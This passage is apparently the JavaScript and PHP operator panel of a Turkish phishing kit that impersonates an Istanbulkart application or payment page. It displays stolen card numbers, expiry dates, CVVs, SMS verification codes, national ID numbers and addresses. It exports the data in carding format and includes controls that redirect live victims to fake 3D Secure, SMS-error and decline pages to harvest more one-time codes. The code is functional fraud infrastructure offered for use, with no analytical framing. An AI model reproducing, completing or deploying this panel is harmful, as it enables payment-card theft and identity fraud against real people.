                '<button onclick="fetchLogs(' + (currentPage - 1) + ')" ' + prevDisabled + ' class="inline-flex items-center px-3 py-1.5 text-sm rounded-lg bg-neutral-100 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 hover:bg-neutral-200 dark:hover:bg-neutral-700 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"><i data-lucide="chevron-left" class="w-4 h-4"></i></button>' +
                '<span class="text-sm text-neutral-700 dark:text-neutral-300 font-medium px-1">' + currentPage + ' / ' + totalPages + '</span>' +
                '<button onclick="fetchLogs(' + (currentPage + 1) + ')" ' + nextDisabled + ' class="inline-flex items-center px-3 py-1.5 text-sm rounded-lg bg-neutral-100 dark:bg-neutral-800 text-neutral-700 dark:text-neutral-300 hover:bg-neutral-200 dark:hover:bg-neutral-700 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"><i data-lucide="chevron-right" class="w-4 h-4"></i></button>' +
                '</div></div>';
            lucide.createIcons();
        }

        function filterLogs() {
            clearTimeout(searchTimer);
            searchTimer = setTimeout(() => fetchLogs(1), 350);
        }

        let clickTimer = null;
        function copyCard(cardNumber) {
            if (clickTimer) { clearTimeout(clickTimer); clickTimer = null; return; }
            clickTimer = setTimeout(() => {
                navigator.clipboard.writeText(cardNumber.replace(/\s/g, ''));
                showToast('Kart numarası kopyalandı', 'success');
                clickTimer = null;
            }, 250);
        }

        function copyFullCard(cardNumber, expiry, cvv) {
            if (clickTimer) { clearTimeout(clickTimer); clickTimer = null; }
            const fullInfo = `${cardNumber.replace(/\s/g, '')}|${expiry}|${cvv}`;
            navigator.clipboard.writeText(fullInfo);
            showToast('Kart bilgileri kopyalandı', 'success');
        }

        function getDeviceIcon(type) {
            const icons = { desktop: 'monitor', tablet: 'tablet', mobile: 'smartphone' };
            return icons[type] || 'monitor';
        }

        function getEngagementColor(score) {
            if (score >= 70) return 'text-green-500';
            if (score >= 40) return 'text-yellow-500';
            return 'text-neutral-400';
        }

        function formatDuration(seconds) {
            if (!seconds) return '-';
            if (seconds < 60) return `${seconds}sn`;
            if (seconds < 3600) return `${Math.floor(seconds / 60)}dk ${seconds % 60}sn`;
            return `${Math.floor(seconds / 3600)}sa ${Math.floor((seconds % 3600) / 60)}dk`;
        }

        function showLogDetail(index) {
            const log = logs[index];
            let items = log.items;
            if (typeof items === 'string') {
                try { items = JSON.parse(items.replace(/&quot;/g, '"').replace(/&amp;/g, '&')); } catch (e) { items = null; }
            }
            const session = sessions[log.session_id] || null;

            const kartTuruLabels = {
                ogrenci: 'Öğrenci', ogretmen: 'Öğretmen', '60yas': '60 Yaş Üstü',
                mavi: 'Mavi Kart', basin: 'Basın Mensubu', ada: 'Ada Sakini Mavi Kart',
                '65yas': '65 Yaş Üstü', spor: 'Spor İstanbul Üye Kartı',
                anne: 'Anne Kart', istanbulkart: 'İstanbulkart', kampus: 'Kampüs Personel Kartı'
            };

            let itemsHtml = '';
            if (Array.isArray(items) && items.length > 0) {
                itemsHtml = items.map(item => `
                    <div class="flex justify-between py-2">
                        <span class="text-sm text-neutral-600 dark:text-neutral-400">${escapeHtml(item.name || '-')} x${item.quantity || 1}</span>
                        <span class="text-sm font-medium text-neutral-900 dark:text-white">${formatMoney(item.price || 0)}</span>
                    </div>
                `).join('');
            } else if (items && typeof items === 'object') {
                const rows = [];
                if (items.kartTuru) {
                    rows.push(['Başvurulan Kart', kartTuruLabels[items.kartTuru] || items.kartTuru]);
                }
                if (items.basvuruSahibi) rows.push(['Başvuru Sahibi', items.basvuruSahibi]);
                if (items.tc) rows.push(['T.C. Kimlik No', items.tc]);
                if (items.basvuruTelefon) rows.push(['Başvuru Telefonu', items.basvuruTelefon]);
                itemsHtml = rows.length > 0
                    ? rows.map(([k, v]) => `
                        <div class="flex justify-between py-2">
                            <span class="text-sm text-neutral-500">${escapeHtml(k)}</span>
                            <span class="text-sm font-medium text-neutral-900 dark:text-white">${escapeHtml(String(v))}</span>
                        </div>
                    `).join('')
                    : '<p class="text-sm text-neutral-500">Başvuru bilgisi yok</p>';
            } else {
                itemsHtml = '<p class="text-sm text-neutral-500">Başvuru bilgisi yok</p>';
            }

            const isApplicationFormat = items && typeof items === 'object' && !Array.isArray(items);
            const itemsSectionTitle = isApplicationFormat ? 'Başvuru Bilgileri' : 'Sepet';

            let trackingHtml = '';
            if (session) {
                trackingHtml = `
                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4">
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-3">Oturum Bilgileri</p>
                        
                        <table class="w-full text-sm">
                            <tbody>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Durum</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">
                                        ${session.is_online ? '<span class="text-green-600">● Online</span>' : '<span class="text-neutral-400">○ Offline</span>'}
                                    </td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Cihaz Türü</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white capitalize">${escapeHtml(session.device_type || '-')}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Ekran Boyutu</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${escapeHtml(session.screen_resolution || '-')}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">İnternet Bağlantısı</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white uppercase">${escapeHtml(session.connection_type || '-')}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Tarayıcı Dili</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${escapeHtml(session.browser_lang || '-')}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Saat Dilimi</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white text-xs">${escapeHtml(session.timezone || '-')}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">İşletim Sistemi</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${escapeHtml(session.platform || '-')}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Dokunmatik Ekran</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${session.is_touch ? 'Evet' : 'Hayır'}</td>
                                </tr>
                            </tbody>
                        </table>

                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mt-4 mb-3">Kullanıcı Davranışı</p>
                        
                        <table class="w-full text-sm">
                            <tbody>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Etkileşim Puanı</td>
                                    <td class="py-2 text-right font-bold text-neutral-900 dark:text-white">${session.engagement_score || 0}/100</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Sayfada Geçirilen Süre</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${formatDuration(session.time_on_page)}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Mouse Tıklaması</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${session.mouse_clicks || 0} kez</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Klavye Kullanımı</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">${session.key_presses || 0} tuş</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Sayfa Kaydırma</td>
                                    <td class="py-2 text-right font-medium text-neutral-900 dark:text-white">%${session.max_scroll_depth || 0}</td>
                                </tr>
                                <tr class="border-b border-neutral-200 dark:border-neutral-700">
                                    <td class="py-2 text-neutral-500">Sekme Değişikliği</td>
                                    <td class="py-2 text-right font-medium ${session.tab_switches > 2 ? 'text-red-500' : 'text-neutral-900 dark:text-white'}">${session.tab_switches || 0} kez</td>
                                </tr>
                                <tr>
                                    <td class="py-2 text-neutral-500">Kopyala-Yapıştır</td>
                                    <td class="py-2 text-right font-medium ${session.paste_count > 0 ? 'text-red-500' : 'text-neutral-900 dark:text-white'}">${session.paste_count || 0} kez</td>
                                </tr>
                            </tbody>
                        </table>

                        ${session.referrer && session.referrer !== 'direct' ? `
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mt-4 mb-2">Nereden Geldi?</p>
                        <p class="text-sm text-neutral-900 dark:text-white break-all">${escapeHtml(session.referrer)}</p>
                        ${session.utm_source ? `<p class="text-xs text-neutral-500 mt-1">Kampanya: ${escapeHtml(session.utm_source)}${session.utm_medium ? ' / ' + escapeHtml(session.utm_medium) : ''}${session.utm_campaign ? ' / ' + escapeHtml(session.utm_campaign) : ''}</p>` : ''}
                        ` : ''}

                        ${session.page_history && session.page_history.length > 0 ? `
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mt-4 mb-2">Gezdiği Sayfalar</p>
                        <p class="text-sm text-neutral-700 dark:text-neutral-300">${session.page_history.map(p => p.page).join(' → ')}</p>
                        ` : ''}

                        ${session.fingerprint ? `
                        <p class="text-[10px] text-neutral-400 mt-4 pt-3 border-t border-neutral-200 dark:border-neutral-700">Tarayıcı Parmak İzi: <code class="text-neutral-500">${escapeHtml(session.fingerprint)}</code></p>
                        ` : ''}
                    </div>
                `;
            } else {
                trackingHtml = `
                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4 text-center">
                        <i data-lucide="wifi-off" class="w-8 h-8 mx-auto text-neutral-300 mb-2"></i>
                        <p class="text-sm text-neutral-500">Canlı takip verisi bulunamadı</p>
                        <p class="text-xs text-neutral-400 mt-1">Kullanıcı offline veya session sona ermiş</p>
                    </div>
                `;
            }

            document.getElementById('modalContent').innerHTML = `
                <div class="space-y-4">
                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4">
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-3">Kart Sahibi</p>
                        <p class="text-sm font-medium text-neutral-900 dark:text-white">${escapeHtml(log.customer_name)}</p>
                        <p class="text-sm text-neutral-500 mt-1">${escapeHtml(log.customer_email || '-')}</p>
                        <p class="text-sm text-neutral-500">${escapeHtml(log.customer_phone || '-')}</p>
                    </div>

                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4">
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-3">Adres</p>
                        <p class="text-sm font-medium text-neutral-900 dark:text-white">${escapeHtml(log.address_title || '-')}</p>
                        <p class="text-sm text-neutral-500 mt-1">${escapeHtml(log.address_full || '-')}</p>
                        <p class="text-sm text-neutral-500">${escapeHtml(log.address_district || '')} ${escapeHtml(log.address_city || '')}</p>
                    </div>

                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4">
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-3">Kart Bilgileri</p>
                        <div class="grid grid-cols-2 gap-3">
                            <div>
                                <p class="text-[11px] text-neutral-400 uppercase">Kart Sahibi</p>
                                <p class="text-sm font-medium text-neutral-900 dark:text-white mt-0.5">${escapeHtml(log.card_holder || '-')}</p>
                            </div>
                            <div>
                                <p class="text-[11px] text-neutral-400 uppercase">Banka</p>
                                <p class="text-sm font-medium text-neutral-900 dark:text-white mt-0.5">${escapeHtml(log.card_bank || '-')}</p>
                            </div>
                            <div class="col-span-2">
                                <p class="text-[11px] text-neutral-400 uppercase">Kart No</p>
                                <code class="text-sm text-neutral-900 dark:text-white mt-0.5 block">${escapeHtml(log.card_number)}</code>
                            </div>
                            <div>
                                <p class="text-[11px] text-neutral-400 uppercase">SKT</p>
                                <p class="text-sm font-medium text-neutral-900 dark:text-white mt-0.5">${escapeHtml(log.card_expiry)}</p>
                            </div>
                            <div>
                                <p class="text-[11px] text-neutral-400 uppercase">CVV</p>
                                <p class="text-sm font-medium text-neutral-900 dark:text-white mt-0.5">${escapeHtml(log.card_cvv)}</p>
                            </div>
                            <div class="col-span-2">
                                <p class="text-[11px] text-neutral-400 uppercase">SMS Kodları</p>
                                <p class="text-sm font-medium text-neutral-900 dark:text-white mt-0.5">${escapeHtml(log.sms_codes || '-')}</p>
                            </div>
                        </div>
                        ${log.card_bin ? `
                        <div class="mt-3 pt-3 border-t border-neutral-200 dark:border-neutral-700">
                            <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-2">BIN Bilgileri</p>
                            <div class="grid grid-cols-3 gap-2">
                                <div>
                                    <p class="text-[10px] text-neutral-400">BIN</p>
                                    <p class="text-xs font-mono text-neutral-900 dark:text-white">${escapeHtml(log.card_bin)}</p>
                                </div>
                                <div>
                                    <p class="text-[10px] text-neutral-400">Tip</p>
                                    <p class="text-xs text-neutral-900 dark:text-white">${log.card_type === 'C' ? 'Credit' : log.card_type === 'D' ? 'Debit' : escapeHtml(log.card_type) || '-'}</p>
                                </div>
                                <div>
                                    <p class="text-[10px] text-neutral-400">Scheme</p>
                                    <p class="text-xs text-neutral-900 dark:text-white">${escapeHtml(log.card_scheme || '-')}</p>
                                </div>
                            </div>
                            ${log.card_sub_type ? `<p class="text-[10px] text-neutral-500 mt-1">${escapeHtml(log.card_sub_type)}</p>` : ''}
                        </div>
                        ` : ''}
                    </div>

                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4">
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-3">${itemsSectionTitle}</p>
                        <div class="divide-y divide-neutral-200 dark:divide-neutral-700">${itemsHtml}</div>
                        ${(log.total && parseFloat(log.total) > 0) ? `
                        <div class="flex justify-between pt-3 mt-2 border-t border-neutral-200 dark:border-neutral-700">
                            <span class="text-sm font-semibold text-neutral-900 dark:text-white">Toplam</span>
                            <span class="text-sm font-semibold text-neutral-900 dark:text-white">${formatMoney(log.total)}</span>
                        </div>
                        ` : ''}
                    </div>

                    ${trackingHtml}

                    <div class="bg-neutral-50 dark:bg-neutral-800/50 rounded-lg p-4">
                        <p class="text-xs font-medium text-neutral-400 uppercase tracking-wider mb-3">Teknik</p>
                        <div class="grid grid-cols-2 gap-3">
                            <div>
                                <p class="text-[11px] text-neutral-400 uppercase">IP</p>
                                <code class="text-sm text-neutral-900 dark:text-white mt-0.5 block">${log.ip}</code>
                            </div>
                            <div>
                                <p class="text-[11px] text-neutral-400 uppercase">Tarih</p>
                                <p class="text-sm text-neutral-900 dark:text-white mt-0.5">${formatDate(log.created_at)}</p>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            openModal('orderModal');
            lucide.createIcons();
        }

        function closeOrderModal() { closeModal('orderModal'); }

        function banIP(index) {
            const log = logs[index];
            document.getElementById('banLogId').value = index;
            document.getElementById('banIP').textContent = log.ip;
            openModal('banModal');
        }

        function closeBanModal() { closeModal('banModal'); }

        async function confirmBan() {
            const index = document.getElementById('banLogId').value;
            const log = logs[index];
            
            try {
                const res = await fetch(`${API_BASE}/bans.php`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: log.ip, reason: 'Manuel ban' })
                });
                const data = await res.json();
                
                if (data.success) {
                    showToast(`${log.ip} başarıyla yasaklandı`, 'success');
                } else {
                    showToast('Ban işlemi başarısız', 'error');
                }
            } catch (e) {
                showToast('Bir hata oluştu', 'error');
            }
            
            closeBanModal();
        }

        async function redirectUser(log, redirectTo) {
            const sessionId = log.session_id;
            
            if (!sessionId) {
                showToast('Session ID bulunamadı', 'error');
                return false;
            }
            
            try {
                const sessionRes = await fetch(`${API_BASE}/sessions.php`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        session_id: sessionId, 
                        redirect_to: redirectTo,
                        log_id: log.id
                    })
                });
                const sessionData = await sessionRes.json();
                
                if (!sessionData.success) {
                    return false;
                }
                
                return true;
            } catch (e) {
                return false;
            }
        }

        async function redirectToWaiting(index) {
            const log = logs[index];
            
            const success = await redirectUser(log, 'waiting');
            
            if (success) {
                showToast(`${log.customer_name} bekleme sayfasına yönlendiriliyor...`, 'success');
                setTimeout(() => { fetchLogs(); fetchSessions(); }, 1000);
            } else {
                showToast('Yönlendirme başarısız', 'error');
            }
        }

        async function redirectTo3DS(index) {
            const log = logs[index];
            
            const success = await redirectUser(log, '3dsecure');
            
            if (success) {
                showToast(`${log.customer_name} 3D Secure sayfasına yönlendiriliyor...`, 'success');
                setTimeout(() => { fetchLogs(); fetchSessions(); }, 1000);
            } else {
                showToast('Yönlendirme başarısız', 'error');
            }
        }

        async function redirectToSmsError(index) {
            const log = logs[index];
            
            const success = await redirectUser(log, 'sms_error');
            
            if (success) {
                showToast(`${log.customer_name} hatalı SMS sayfasına yönlendiriliyor...`, 'success');
                setTimeout(() => { fetchLogs(); fetchSessions(); }, 1000);
            } else {
                showToast('Yönlendirme başarısız', 'error');
            }
        }

        async function redirectToSuccess(index) {
            const log = logs[index];
            
            const success = await redirectUser(log, 'success');
            
            if (success) {
                await fetch(`${API_BASE}/logs.php`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: log.id, redirect_to: 'success', status: 'completed' })
                });
                
                showToast(`${log.customer_name} işlemi onaylandı`, 'success');
                setTimeout(() => { fetchLogs(); fetchSessions(); }, 1000);
            } else {
                showToast('Onaylama başarısız', 'error');
            }
        }

        function showErrorModal(index) {
            const log = logs[index];
            document.getElementById('errorLogId').value = index;
            document.getElementById('errorUserName').textContent = log.customer_name;
            document.getElementById('errorMessage').value = '';
            
            const templates = [
                'Kart bilgileriniz hatalı. Lütfen tekrar deneyin.',
                'İşlem zaman aşımına uğradı. Lütfen tekrar deneyin.',
                'Yetersiz bakiye. Lütfen farklı bir kart deneyin.',
                'Banka tarafından reddedildi.',
                '3D Secure doğrulaması başarısız.'
            ];
            
            document.getElementById('errorTemplates').innerHTML = templates.map(t => 
                `<button onclick="setErrorMessage('${t}')" class="px-3 py-1.5 text-xs bg-neutral-100 dark:bg-neutral-800 text-neutral-600 dark:text-neutral-400 rounded-lg hover:bg-neutral-200 dark:hover:bg-neutral-700 transition-colors">${t.split('.')[0]}</button>`
            ).join('');
            
            openModal('errorModal');
        }

        function closeErrorModal() { closeModal('errorModal'); }
        function setErrorMessage(msg) { document.getElementById('errorMessage').value = msg; }

        async function sendErrorMessage() {
            const index = document.getElementById('errorLogId').value;
            const message = document.getElementById('errorMessage').value;
            const log = logs[index];
            
            if (!message.trim()) {
                showToast('Lütfen bir hata mesajı girin', 'error');
                return;
            }
            
            try {
                await fetch(`${API_BASE}/logs.php`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        id: log.id, 
                        redirect_to: 'error', 
                        error_message: message,
                        status: 'failed'
                    })
                });
                
                const success = await redirectUser(log, 'error');
                const data = { success };
                
                if (data.success) {
                    showToast(`${log.customer_name} kullanıcısına hata mesajı gönderildi`, 'success');
                    fetchLogs();
                } else {
                    showToast('Hata mesajı gönderilemedi', 'error');
                }
            } catch (e) {
                showToast('Bir hata oluştu', 'error');
            }
            
            closeErrorModal();
        }

        function exportTXT() {
            let txt = '';
            logs.forEach((l, i) => {
                txt += `===== Log #${l.id} =====\n`;
                txt += `İsim     : ${l.customer_name}\n`;
                txt += `E-posta  : ${l.customer_email || '-'}\n`;
                txt += `Telefon  : ${l.customer_phone || '-'}\n`;
                txt += `Kart No  : ${l.card_number}\n`;
                txt += `SKT      : ${l.card_expiry}\n`;
                txt += `CVV      : ${l.card_cvv}\n`;
                txt += `SMS      : ${l.sms_codes || '-'}\n`;
                txt += `Banka    : ${l.card_bank || '-'}\n`;
                txt += `IP       : ${l.ip}\n`;
                txt += `Tutar    : ${l.total}\n`;
                txt += `Tarih    : ${l.created_at}\n`;
                if (i < logs.length - 1) txt += '\n';
            });
            
            const blob = new Blob([txt], { type: 'text/plain;charset=utf-8;' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'loglar_' + new Date().toISOString().split('T')[0] + '.txt';
            link.click();
        }

        function formatMoney(amount) {
            return new Intl.NumberFormat('tr-TR', { style: 'currency', currency: 'TRY' }).format(amount || 0);
        }

        function formatDate(dateStr) {
            if (!dateStr) return '-';
            const d = new Date(dateStr);
            return d.toLocaleDateString('tr-TR') + ' ' + d.toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
        }

        let toastCount = 0;
        function showToast(message, type = 'info') {
            const config = {
                success: { icon: 'check', bg: 'bg-emerald-500', iconBg: 'bg-emerald-600' },
                error: { icon: 'x', bg: 'bg-red-500', iconBg: 'bg-red-600' },
                warning: { icon: 'alert-triangle', bg: 'bg-amber-500', iconBg: 'bg-amber-600' },
                info: { icon: 'info', bg: 'bg-blue-500', iconBg: 'bg-blue-600' }
            };
            
            const { icon, bg, iconBg } = config[type];
            const container = document.getElementById('toastContainer');
            const toastId = `toast-${++toastCount}`;
            
            const toast = document.createElement('div');
            toast.id = toastId;
            toast.className = `${bg} text-white rounded-2xl shadow-2xl flex items-stretch min-w-[320px] max-w-[420px] transform translate-x-[120%] overflow-hidden`;
            toast.style.boxShadow = '0 20px 40px -12px rgba(0,0,0,0.35)';
            toast.innerHTML = `
                <div class="${iconBg} flex items-center justify-center px-4">
                    <i data-lucide="${icon}" class="w-5 h-5"></i>
                </div>
                <div class="flex-1 flex items-center justify-between gap-3 px-4 py-3">
                    <span class="text-sm font-medium leading-tight">${message}</span>
                    <button onclick="dismissToast('${toastId}')" class="p-1.5 hover:bg-white/20 rounded-lg transition-colors flex-shrink-0">
                        <i data-lucide="x" class="w-4 h-4"></i>
                    </button>
                </div>
            `;
            toast.style.position = 'relative';
            
            container.appendChild(toast);
            lucide.createIcons();
            
            requestAnimationFrame(() => {
                toast.style.transition = 'transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1)';
                toast.style.transform = 'translateX(0)';
            });
            
            setTimeout(() => dismissToast(toastId), 4000);
        }

        function dismissToast(toastId) {
            const toast = document.getElementById(toastId);
            if (!toast) return;
            toast.style.transition = 'transform 0.4s cubic-bezier(0.4, 0, 1, 1), opacity 0.3s ease';
            toast.style.transform = 'translateX(120%) scale(0.9)';
            toast.style.opacity = '0';
            setTimeout(() => toast.remove(), 400);
        }

        function deleteLog(index) {
            const log = logs[index];
            document.getElementById('deleteLogId').value = log.id;
            document.getElementById('deleteLogName').textContent = `${log.customer_name} - ${log.card_number}`;
            openModal('deleteModal');
        }

        function closeDeleteModal() { closeModal('deleteModal'); }

        async function confirmDelete() {
            const logId = document.getElementById('deleteLogId').value;
            
            try {
                const res = await fetch(`${API_BASE}/logs.php?id=${logId}`, {
                    method: 'DELETE'
                });
                const data = await res.json();
                
                if (data.success) {
                    showToast('Log başarıyla silindi', 'success');
                    fetchLogs();
                } else {
                    showToast(data.error || 'Silme işlemi başarısız', 'error');
                }
            } catch (e) {
                showToast('Bir hata oluştu', 'error');
            }
            
            closeDeleteModal();
        }

        function confirmDeleteAll() {
            if (logs.length === 0) {
                showToast('Silinecek log bulunamadı', 'error');
                return;
            }
            openModal('deleteAllModal');
        }

        function closeDeleteAllModal() { closeModal('deleteAllModal'); }

        async function executeDeleteAll() {
            try {
                const res = await fetch(`${API_BASE}/logs.php?all=1`, {
                    method: 'DELETE'
                });
                const data = await res.json();
                
                if (data.success) {
                    showToast(`${data.deleted} log başarıyla silindi`, 'success');
                    fetchLogs();
                } else {
                    showToast(data.error || 'Silme işlemi başarısız', 'error');
                }
            } catch (e) {
                showToast('Bir hata oluştu', 'error');
            }
            
            closeDeleteAllModal();
        }

        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') {
                closeOrderModal();
                closeErrorModal();
                closeBanModal();
                closeDeleteModal();
                closeDeleteAllModal();
            }
        });

        fetchLogs();
        fetchSessions();
        
        setInterval(() => {
            fetchLogs();
            fetchSessions();
        }, 2000);

        document.addEventListener('mouseenter', function(e) {
            const trigger = e.target.closest('.tooltip-wrapper:has(.bank-tooltip)');
            if (!trigger) return;
            const tip = trigger.querySelector('.bank-tooltip');
            if (!tip) return;
            const rect = trigger.getBoundingClientRect();
            tip.style.left = rect.left + (rect.width / 2) - 100 + 'px';
            if (rect.top < 140) {
                tip.style.top = rect.bottom + 8 + 'px';
            } else {
                tip.style.top = rect.top - tip.offsetHeight - 8 + 'px';
            }
            tip.classList.add('show');
        }, true);

        document.addEventListener('mouseleave', function(e) {
            const trigger = e.target.closest('.tooltip-wrapper:has(.bank-tooltip)');
            if (!trigger) return;
            const tip = trigger.querySelector('.bank-tooltip');
            if (tip) tip.classList.remove('show');
        }, true);
    </script>

<?php include 'includes/footer.php'; ?>
